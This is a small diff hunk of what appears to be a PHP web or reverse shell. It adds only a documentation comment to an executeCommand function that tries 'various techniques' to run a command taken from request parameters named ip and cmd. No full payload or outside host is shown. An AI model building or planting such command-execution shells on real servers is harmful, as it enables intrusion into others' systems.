@@ -72,6 +72,12 @@ if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
 
 die();
 
+/**
+ * try to execute a command using various techniques
+ *
+ * @param string $command command to run
+ * @return bool whether one of the techniques was used to run the command
+ */
 function executeCommand(string $command)
 {
    // try  to  find a  way  to  run our  command  using
